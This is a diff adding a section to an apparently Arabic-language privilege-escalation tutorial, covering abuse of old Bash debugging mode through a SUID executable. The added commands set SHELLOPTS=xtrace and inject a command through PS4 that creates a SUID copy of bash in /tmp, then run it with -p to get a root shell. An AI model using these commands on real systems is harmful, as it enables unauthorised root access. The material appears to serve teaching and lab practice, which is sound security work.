@@ -579,6 +579,29 @@ Used responsibly, this is a great example of **local privilege escalation** via 
 
 * <details>
      <summary>Abusing Shell Features (#2)</summary>
+
+
+   # SUID/SGID Executable - Abusing Shell #2
+
+   ### 12) SUID/SGID executable - Abusing Shell #2
+
+   * إستغلال أيضاً إصدارات `Bash` القديمة ولكن لتمكين وضع ال  `Debugging`.
+   * و الاستفادة من متغير `PS4` لحقن أمر خبيث يمكن المستخدم من ترقية صلاحياته والحصول على `Root Shell`.
+
+   * Run the SUID executable with custom environment variables:
+       ```bash
+       env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+       ```
+       * (إنشاء نسخة من `Bash` بصلاحيات `Root` ما سيسمح للمهاجم بالحصول على `Root Shell`)
+
+   * Execute the newly created SUID shell:
+       ```bash
+       /tmp/rootbash -p
+       ```
+       * (تشغيل الملف الذي أنشأناه بصلاحيات `Root` الذي يحافظ على الصلاحيات `p-`)
+
+
+
   </details>
 
 
